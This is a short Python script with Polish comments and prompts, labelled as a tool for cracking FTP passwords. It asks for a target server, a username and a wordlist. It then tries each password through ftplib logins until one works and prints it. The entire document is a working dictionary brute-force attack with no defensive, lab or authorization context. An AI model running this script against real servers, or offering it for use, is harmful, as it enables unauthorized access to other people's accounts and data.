#!/usr/bin/python3

# Skrypt Python do łamania haseł FTP



import ftplib



server = input("Serwer FTP: ")

user = input("Nazwa użytkownika: ")

password_list_path = input("Ścieżka do listy haseł > ")



try:

    with open(password_list_path, 'r') as pw_file:

        for word in pw_file:

            word = word.strip()  # Usuń znaki końca linii i białe znaki



            try:

                ftp = ftplib.FTP(server)

                ftp.login(user, word)

                print('SUKCES! Hasło to: ' + word)

                ftp.quit()  # Zamknij połączenie po udanym logowaniu

                break  # Jeśli hasło jest poprawne, zakończ pętlę



            except ftplib.error_perm:

                print('Niepoprawne hasło, próbuję dalej...')



except FileNotFoundError:

    print('Błąd: Nie znaleziono listy haseł')



except Exception as e:

    print('Wystąpił błąd:', e)

